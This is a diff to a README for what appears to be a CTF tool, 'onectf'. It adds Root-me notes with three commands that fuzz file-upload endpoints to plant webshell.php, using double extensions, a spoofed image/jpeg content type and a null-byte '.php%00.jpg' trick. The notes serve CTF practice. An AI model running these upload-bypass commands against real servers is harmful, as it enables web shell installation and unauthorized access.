@@ -63,3 +63,10 @@ $ onectf uffuf -u <IP:port>/upload.php -p uploadFile -w web-extensions.txt -F we
 * Add an initial dummy test
 * Improve Verbose Mode
 * Add option to test if uploaded file is executable?
+* Root-me notes
+
+```ps
+$ onectf uffuf -u URL -p file -F webshell.php -Fn dummyFUZZ -v -W .php.png
+$ onectf uffuf -u URL -p file -F webshell.php -Fn dummyFUZZ -v -W .php -Ft 'image/jpeg' -H 'Cookie: PHPSESSID=xxx'
+$ onectf uffuf -u URL -p file -F webshell.php -Fn dummyFUZZ -v -W '.php%00.jpg' -Ft 'image/jpeg'
+```
